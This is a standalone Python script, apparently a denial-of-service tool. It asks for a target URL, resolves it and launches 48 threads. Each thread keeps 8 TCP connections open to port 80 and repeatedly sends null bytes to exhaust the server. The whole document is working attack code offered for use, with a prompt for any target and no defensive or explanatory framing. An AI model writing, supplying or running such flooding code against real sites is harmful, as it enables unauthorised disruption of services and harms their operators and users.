import socket
import threading
import time
import sys

# Configuration
CONNECTIONS = 8
THREADS = 48

def get_target_ip(url):
    """Resolve domain to IP address."""
    try:
        return socket.gethostbyname(url)
    except socket.gaierror:
        print("[Error] Invalid URL!")
        sys.exit(1)

def make_socket(target_ip, port):
    """Creates a TCP socket and connects to the target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        print(f"[Connected -> {target_ip}:{port}]")
        return sock
    except socket.error:
        return None

def attack(target_ip, port, thread_id):
    """Continuously sends null bytes to the target."""
    sockets = [None] * CONNECTIONS
    while True:
        for i in range(CONNECTIONS):
            if sockets[i] is None:
                sockets[i] = make_socket(target_ip, port)
            if sockets[i]:
                try:
                    sockets[i].send(b"\0")
                    print(f"[{thread_id}: Voly Sent]")
                except socket.error:
                    sockets[i].close()
                    sockets[i] = make_socket(target_ip, port)
        time.sleep(0.3)

if __name__ == "__main__":
    # Ask user for the target URL
    target_url = input("Enter Target URL (e.g., example.com): ")
    target_port = 80  # Default HTTP port (Change if needed)

    target_ip = get_target_ip(target_url)

    print(f"[Target Resolved] {target_url} -> {target_ip}:{target_port}")

    # Start attack threads
    for i in range(THREADS):
        threading.Thread(target=attack, args=(target_ip, target_port, i), daemon=True).start()
        time.sleep(0.2)

    input("Press Enter to stop...\n")  # Keeps the script running
